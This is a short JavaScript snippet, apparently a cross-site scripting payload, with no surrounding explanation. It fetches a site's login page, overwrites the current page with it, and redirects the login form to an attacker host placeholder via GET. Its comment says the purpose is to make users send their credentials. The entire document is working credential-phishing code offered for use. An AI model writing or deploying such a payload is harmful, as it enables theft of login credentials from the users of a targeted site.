// force the user to send us their credentials
fetch("<LOGIN-ENDPOINT>").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://<HOST>"
	document.getElementsByTagName("form")[0].method = "get"
}))
